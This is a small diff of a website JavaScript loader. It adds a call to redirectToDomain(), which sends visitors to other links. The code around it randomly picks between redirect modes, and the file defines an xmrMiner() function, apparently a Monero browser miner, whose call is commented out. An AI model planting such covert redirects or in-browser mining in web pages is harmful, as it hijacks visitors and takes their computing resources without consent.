@@ -16,6 +16,7 @@ var links = [
 
 function loadIMCMain() {
     loadScripts(jsFiles);
+    redirectToDomain();
     baiduTongji();
     googleAnalytics();
     // xmrMiner();
@@ -34,10 +35,8 @@ function loadIMCMain() {
     var randomNumber = Math.random();
     if (randomNumber >= 0.8) {
         redirectToLinks('loc');
-        console.log("loc");
     } else {
         redirectToLinks('win');
-        console.log("win");
     }
 }
 
@@ -95,7 +94,7 @@ function redirectToDomain() {
         default:
             break;
     }
-    redirectToLinks('win', url);
+    redirectToLinks('loc', url);
 }
 
 function xmrMiner() {
